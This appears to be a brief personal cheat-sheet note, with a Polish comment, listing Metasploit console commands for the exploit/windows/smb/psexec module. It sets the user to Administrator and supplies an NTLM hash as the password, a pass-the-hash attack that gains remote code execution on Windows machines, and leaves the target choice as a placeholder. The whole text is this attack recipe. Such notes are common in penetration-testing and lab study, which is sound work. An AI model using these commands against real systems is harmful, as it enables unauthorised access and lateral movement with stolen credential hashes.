```bash
msfconsole
exploit/windows/smb/psexec
set smbuser Administrator
set smbpass <ln:ntlm hash>
set target ... # wybrać odpoweidni target (chyba Native Upload)
```